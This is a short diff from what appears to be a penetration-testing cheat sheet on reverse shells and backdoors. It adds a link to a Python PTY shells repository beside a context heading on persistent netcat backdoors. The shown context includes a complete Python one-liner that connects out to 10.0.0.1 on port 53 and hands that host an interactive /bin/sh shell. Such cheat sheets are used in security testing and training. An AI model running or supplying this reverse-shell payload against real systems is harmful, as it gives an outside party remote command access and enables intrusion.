@@ -64,6 +64,7 @@ Persistent netcat backdoor using a while loop or nohup:
     
 ### other languages  
 Python: 
+[Python PTY Shells](https://github.com/infodox/python-pty-shells/)     
 
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' 
     
